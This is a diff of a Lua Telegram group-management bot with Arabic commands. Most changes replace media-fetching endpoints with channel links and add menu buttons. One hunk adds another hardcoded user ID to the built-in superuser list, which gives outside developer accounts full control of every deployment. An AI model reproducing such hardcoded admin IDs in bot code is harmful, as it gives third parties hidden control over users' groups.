@@ -144,7 +144,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1558668590,1914652457,1516553352}
+SudoIds = {Config.SudoIds,1558668590,1914652457,1516553352,1797851811}
 David = Config.David
 TokenBot = Config.TokenBot
 NameBot = (DevRio:get(David..'Rio:NameBot') or 'ديفد')
@@ -596,7 +596,7 @@ end ,nil)
 end
 --     Source David     --
 local RioRank = function(msg) if SudoId(msg.sender_user_id_) then DavidTeam  = "المطور" elseif RioSudo(msg) then DavidTeam = "المطور" elseif SecondSudo(msg) then DavidTeam = "المطور" elseif SudoBot(msg) then DavidTeam = "المطور" elseif Manager(msg) then DavidTeam = "المدير" elseif Admin(msg) then DavidTeam = "الادمن" else DavidTeam = "العضو" end return DavidTeam end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1914652457) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1516553352) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(David) then DavidTeam = 'البوت' elseif SudoId(user_id) then DavidTeam = 'المطور الاساسي' elseif DevRio:sismember(David..'Rio:RioSudo:', user_id) then DavidTeam = 'المطور الاساسي' elseif DevRio:sismember(David..'Rio:SecondSudo:', user_id) then DavidTeam = 'المطور الاساسي²' elseif DevRio:sismember(David..'Rio:SudoBot:', user_id) then DavidTeam = DevRio:get(David.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(David..'Rio:RioConstructor:'..chat_id, user_id) then DavidTeam = 'المالك' elseif DevRio:sismember(David..'Rio:BasicConstructor:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(David..'Rio:Constructor:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(David..'Rio:Managers:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(David..'Rio:Admins:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(David..'Rio:VipMem:'..chat_id, user_id) then  DavidTeam = DevRio:get(David.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(David..'Rio:Cleaner:'..chat_id, user_id) then  DavidTeam = DevRio:get(David.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else DavidTeam = DevRio:get(David.."Rio:mem:Rd"..chat_id) or 'العضو' end return DavidTeam end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1914652457) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1797851811) then DavidTeam = 'كوسي' elseif tonumber(user_id) == tonumber(1516553352) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(David) then DavidTeam = 'البوت' elseif SudoId(user_id) then DavidTeam = 'المطور الاساسي' elseif DevRio:sismember(David..'Rio:RioSudo:', user_id) then DavidTeam = 'المطور الاساسي' elseif DevRio:sismember(David..'Rio:SecondSudo:', user_id) then DavidTeam = 'المطور الاساسي²' elseif DevRio:sismember(David..'Rio:SudoBot:', user_id) then DavidTeam = DevRio:get(David.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(David..'Rio:RioConstructor:'..chat_id, user_id) then DavidTeam = 'المالك' elseif DevRio:sismember(David..'Rio:BasicConstructor:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(David..'Rio:Constructor:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(David..'Rio:Managers:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(David..'Rio:Admins:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(David..'Rio:VipMem:'..chat_id, user_id) then  DavidTeam = DevRio:get(David.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(David..'Rio:Cleaner:'..chat_id, user_id) then  DavidTeam = DevRio:get(David.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else DavidTeam = DevRio:get(David.."Rio:mem:Rd"..chat_id) or 'العضو' end return DavidTeam end
 --     Source David     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -2093,7 +2093,6 @@ if text == "الحمايه" or text == "↫ الحمايه ᥀" then  Dev_Rio(ms
 if text == "الزخرفه" or text == "↫ الزخرفه ᥀" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بأرسال أمر زخرفه وثم ارسال الاسم الذي تريد زخرفته بألانكليزي أو العربي', 1, 'md') end
 if text == "معاني الاسماء" or text == "↫ معاني الاسماء ᥀" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙ من خلال البوت يمكنك معرفه معنى اسمك \n᥀︙ فقط قم بارسال امر معنى اسم + الاسم \n᥀︙ مثال : معنى اسم ريو', 1, 'md') end
 if text == "عدد المسح" or text == "تعين عدد المسح" or text == "تعيين عدد المسح" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر عدد المسح + عدد المسح \n᥀︙ مثال : عدد المسح 100', 1, 'md') end
-if text == "كول" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر كول + الكلمه\n᥀︙سيقوم البوت بحذف الكلمه وارسالها \n᥀︙ مثال : كول هلو', 1, 'md') end
 if text == "انطق" then  Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙ فقط قم بارسال امر انطق + الكلمه\n᥀︙سيقوم البوت بنطق الكلمه \n᥀︙ مثال : انطق هلو', 1, 'md') end
 if text == "يوتيوب" and ChCheck(msg) or text == "اليوتيوب" and ChCheck(msg) or text == "↫ بوت اليوتيوب ᥀" and ChCheck(msg) or text == "بوت اليوتيوب" and ChCheck(msg) or text == "اريد بوت يوتيوب" and ChCheck(msg) or text == "شمرلي بوت يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/t_stbot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت اليوتيوب*',nil,inline) return false end
 if text == "اهمس" and ChCheck(msg) or text == "↫ بوت الهمسه ᥀" and ChCheck(msg) or text == "بوت الهمسه" and ChCheck(msg) or text == "همسه" and ChCheck(msg) or text == "اريد بوت الهمسه" and ChCheck(msg) or text == "دزلي بوت الهمسه" and ChCheck(msg) or text == "دزولي بوت الهمسه" and ChCheck(msg) then  Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙@HMSEBOT\n᥀︙@nnbbot\n᥀︙@ocBot\n᥀︙@hebot ', 1, 'md') end
@@ -2175,8 +2174,8 @@ keyboard.inline_keyboard = {
 {{text="🦖 لعبة التنين 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 لعبة الافعى 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
 {{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
 {{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
+{{text="لعبة النينجا",url='https://t.me/gamee?game=GravityNinja21'},{text="لعبة الكرتي",url='https://t.me/gamee?game=KarateKid2'}},
 {{text = '᥀ David Team .', url="t.me/L9L9L"}},
-
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -3603,15 +3602,19 @@ DevRio:set(David..'Rio:NameBot', text)
 return false 
 end
 --     Source David     --
-if text == "الرابط" and ChCheck(msg) then
-if not DevRio:get(David.."Rio:Lock:GpLinks"..msg.chat_id_) then 
-if DevRio:get(David.."Rio:Groups:Links"..msg.chat_id_) then
-Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙𝖦𝗋𝗈𝗎𝗉 𝖫𝗂𝗇𝗄 ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(David.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
+if text == "الرابط" then
+if not DevRio:get(David..'Rio:Lock:GpLinks'..msg.chat_id_) then 
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
+local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevRio:get(David.."Private:Group:Link"..msg.chat_id_) 
+if linkgpp.ok == true then 
+local Text = '᥀︙𝖫𝗂𝗇𝗄 𝖦𝗋𝗈𝗎𝗉 ↬ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n['..ta.title_..']('..linkgpp.result..')'
+local inline = {{{text = ta.title_, url=linkgpp.result}},
+} 
+SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5) 
 else 
-Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
-end
-else
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙جلب رابط المجموعه معطل', 1, 'md')
+end 
+end,nil) 
 end
 end
 --     Source David     --
@@ -4419,7 +4422,7 @@ getUser(msg.sender_user_id_,get_me)
 end
 end
 --     Source David     --
-if text == "تعيين قناة الاشتراك" and ChCheck(msg) or text == "تغيير قناة الاشتراك" and ChCheck(msg) or text == "تعيين الاشتراك الاجباري" and ChCheck(msg) or text == "وضع قناة الاشتراك" and ChCheck(msg) or text == "↫ تعيين قناة الاشتراك ᥀" and ChCheck(msg) then
+if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" or text == "↫ تعيين قناة الاشتراك ᥀" then
 if not SecondSudo(msg) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
 else
@@ -4428,7 +4431,7 @@ send(msg.chat_id_, msg.id_, '᥀︙ارسل لي معرف قناة الاشتر�
 end
 return false  
 end
-if text == "تفعيل الاشتراك الاجباري" and ChCheck(msg) or text == "↫  تفعيل الاشتراك الاجباري ᥀" and ChCheck(msg) then  
+if text == "تفعيل الاشتراك الاجباري" or text == "↫  تفعيل الاشتراك الاجباري ᥀" then  
 if not SecondSudo(msg) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
 else
@@ -4443,7 +4446,7 @@ end
 end
 return false  
 end
-if text == "تعطيل الاشتراك الاجباري" and ChCheck(msg) or text == "↫  تعطيل الاشتراك الاجباري ᥀" and ChCheck(msg) then  
+if text == "تعطيل الاشتراك الاجباري" or text == "↫  تعطيل الاشتراك الاجباري ᥀" then  
 if not SecondSudo(msg) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
 else
@@ -4453,7 +4456,7 @@ riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(m
 end
 return false  
 end
-if text == "حذف قناة الاشتراك" and ChCheck(msg) or text == "حذف قناه الاشتراك" and ChCheck(msg) or text == "↫ حذف قناة الاشتراك ᥀" and ChCheck(msg) then
+if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" or text == "↫ حذف قناة الاشتراك ᥀" then
 if not SecondSudo(msg) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
 else
@@ -4462,7 +4465,7 @@ Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙تم حذف قناة الاشتراك ا
 end
 end
 if SecondSudo(msg) then
-if text == 'جلب قناة الاشتراك' and ChCheck(msg) or text == 'قناة الاشتراك' and ChCheck(msg) or text == 'الاشتراك الاجباري' and ChCheck(msg) or text == 'قناة الاشتراك الاجباري' and ChCheck(msg) or text == '↫ قناة الاشتراك ᥀' and ChCheck(msg) then
+if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' or text == '↫ قناة الاشتراك ᥀' then
 if DevRio:get(David..'Rio:ChId') then
 local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(David.."Rio:ChId"))
 local GetInfo = JSON.decode(Check)
@@ -4507,10 +4510,10 @@ Welcome To Source
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '᥀ Source Channel',url="https://t.me/L9L9L"}},
-{{text = '᥀ Developer',url="t.me/tsttt"},{text = '᥀ Tws David',url="https://t.me/W555Bot"}},
+{{text = '᥀ Developer',url="t.me/tsttt"},{text = '᥀ Tws David',url="https://t.me/W555Bot"}},{{text= '᥀ Support Source .',url="https://t.me/joinchat/L980Ig8wQnAyN2Vi"}}
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/L9L9L&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/X6UX6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 --     Source David     --
@@ -9097,20 +9100,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:gif:Rio'..msg.chat_id_,true)  
 end
-if text == "متحركه" or text == "↫ متحركه ᥀" and not DevRio:get(David..'Rio:gif:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/animation.php')
-if res == 200 then
-animation = json:decode(data)
-if animation.Info == true then
+if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevRio:get(David..'Rio:gif:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(2,1075); 
 local Text ='*᥀︙تم اختيار المتحركه لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation='..URL.escape(animation.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تفعيل الميمز" and Manager(msg) and SourceCh(msg) then
@@ -9123,20 +9121,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:memz:Rio'..msg.chat_id_,true)  
 end
-if text == "ميمز" or text == "↫ ميمز ᥀" and not DevRio:get(David..'Rio:memz:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/memz.php')
-if res == 200 then
-Audios = json:decode(data)
-if Audios.Info == true then
+if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevRio:get(David..'Rio:memz:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(2,1201); 
 local Text ='*᥀︙تم اختيار مقطع الميمز لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل غنيلي" and Manager(msg) and SourceCh(msg) then
@@ -9149,20 +9142,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:Audios:Rio'..msg.chat_id_,true)  
 end
-if text == "غنيلي" or text == "↫ غنيلي ᥀" and not DevRio:get(David..'Rio:Audios:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Audios.php')
-if res == 200 then
-Audios = json:decode(data)
-if Audios.Info == true then
+if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevRio:get(David..'Rio:Audios:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(4,2725); 
 local Text ='*᥀︙تم اختيار المقطع الصوتي لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تفعيل اغنيه" and Manager(msg) and SourceCh(msg) then
@@ -9175,20 +9163,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:mp3:Rio'..msg.chat_id_,true)  
 end
-if text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني" and not DevRio:get(David..'Rio:mp3:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/mp3.php')
-if res == 200 then
-Audios = json:decode(data)
-if Audios.Info == true then
+if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevRio:get(David..'Rio:mp3:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(2,1167); 
 local Text ='*᥀︙تم اختيار الاغنيه لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/DavidMp3/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تفعيل الريمكس" and Manager(msg) and SourceCh(msg) then
@@ -9201,20 +9184,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:Remix:Rio'..msg.chat_id_,true)  
 end
-if text == "ريمكس" or text == "↫ ريمكس ᥀" and not DevRio:get(David..'Rio:Remix:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Remix.php')
-if res == 200 then
-Audios = json:decode(data)
-if Audios.Info == true then
+if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevRio:get(David..'Rio:Remix:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(2,612); 
 local Text ='*᥀︙تم اختيار الريمكس لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل صوره" and Manager(msg) and SourceCh(msg) or text == "تفعيل الصوره" and Manager(msg) and SourceCh(msg) then
@@ -9227,20 +9205,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:Photo:Rio'..msg.chat_id_,true)  
 end
-if text == "صوره" or text == "↫ صوره ᥀" and not DevRio:get(David..'Rio:Photo:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Photo.php')
-if res == 200 then
-photo = json:decode(data)
-if photo.Info == true then
+if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevRio:get(David..'Rio:Photo:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(4,1122); 
 local Text ='*᥀︙تم اختيار الصوره لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo='..URL.escape(photo.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل انمي" and Manager(msg) and SourceCh(msg) or text == "تفعيل الانمي" and Manager(msg) and SourceCh(msg) then
@@ -9253,20 +9226,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:Anime:Rio'..msg.chat_id_,true)  
 end
-if text == "انمي" or text == "↫ انمي ᥀" and not DevRio:get(David..'Rio:Anime:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Anime.php')
-if res == 200 then
-photo = json:decode(data)
-if photo.Info == true then
+if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevRio:get(David..'Rio:Anime:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(3,1002); 
 local Text ='*᥀︙تم اختيار صورة الانمي لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo='..URL.escape(photo.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل فلم" and Manager(msg) and SourceCh(msg) then
@@ -9279,20 +9247,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:Movies:Rio'..msg.chat_id_,true)  
 end
-if text == "فلم" or text == "↫ فلم ᥀" and not DevRio:get(David..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Movies.php')
-if res == 200 then
-photo = json:decode(data)
-if photo.Info == true then
-local Text ='*᥀︙تم اختيار فلم لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevRio:get(David..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
+Rio = math.random(45,125); 
+local Text ='*᥀︙تم اختيار الفلم لك*'
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo='..URL.escape(photo.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
